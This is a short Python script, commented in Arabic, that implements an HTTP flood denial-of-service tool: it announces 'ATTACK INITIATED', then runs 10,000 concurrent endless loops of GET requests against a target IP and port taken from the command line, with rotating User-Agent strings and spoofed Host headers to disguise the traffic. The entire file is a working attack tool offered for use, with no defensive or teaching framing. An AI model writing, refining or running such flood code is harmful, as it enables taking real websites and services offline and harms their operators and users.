import asyncio
import aiohttp
import random
import sys
import os
from rich.console import Console
from rich.text import Text

# إعدادات الطباعة الكبيرة باستخدام مكتبة rich
console = Console()

def print_large_text(text):
    styled_text = Text(text, style="white on green", justify="center")
    console.print(styled_text, justify="center")

os.system("cls" if os.name == "nt" else "clear")
print_large_text("ATTACK INITIATED")

# عدد الطلبات المتزامنة
connections = 10000

# قائمة بمواقع شهيرة
websites = [
    "facebook.com", "google.com", "youtube.com", "yahoo.com", "baidu.com",
    "wikipedia.org", "amazon.com", "twitter.com", "instagram.com", "linkedin.com"
]

# قائمة لوكلاء المستخدم العشوائيين
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0"
]

# دالة لتوليد اسم حساب عشوائي
def random_username():
    return "user" + str(random.randint(1, 1000000))

async def attack(session, ip, port):
    url = f"http://{ip}:{port}"
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Host": f"{random_username()}.{random.choice(websites)}"
            }
            async with session.get(url, headers=headers) as response:
                print(f"ATTACK {ip} {port} with {connections} connections")
                await response.text()  # قراءة النص من الاستجابة
        except Exception as e:
            print(f"Failed to connect to {ip} on port {port}: {e}")
            await asyncio.sleep(0.1)

async def start_attack(ip, port):
    async with aiohttp.ClientSession() as session:
        tasks = [attack(session, ip, port) for _ in range(connections)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 script.py -ip <target_ip> -p <target_port>")
        sys.exit()

    target_ip = sys.argv[2]
    target_port = sys.argv[4]

    asyncio.run(start_attack(target_ip, target_port))